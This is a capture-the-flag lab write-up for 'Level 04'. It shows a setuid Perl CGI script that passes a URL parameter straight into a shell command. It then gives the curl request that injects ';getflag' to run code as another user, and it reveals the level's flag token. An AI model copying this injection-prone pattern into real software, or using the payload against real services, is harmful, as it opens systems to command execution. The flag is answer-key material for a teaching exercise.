# Level 04

As `level04` if we run `ls` we see that a `level04.pl` script is present in the home directory.

```pl
  $> cat level04.pl

  #!/usr/bin/perl
  # localhost:4747
  use CGI qw{param};
  print "Content-type: text/html\n\n";
  sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
  }
  x(param("x"));
```

> This script is running on `<VM-IP>`<sup>1</sup>`:4747` and prints the value of query parameter `x`.

If we look for more details about this script with `ls -l level04.pl`...

```shell
  $> ls -l level04.pl
  total 4
  -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Like the previous level, this script is executed as `flag04` so it has access to `getflag`, all we need to do is escaping `echo` and call it.

```shell
  $> curl localhost:4747?x=%3Bgetflag
  Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

> The sequence `%3B` is equivalent to `;` to encode it safely in URL query.

So, `ne2searoevaevoem4ov4ar8ap` is the flag for this level.
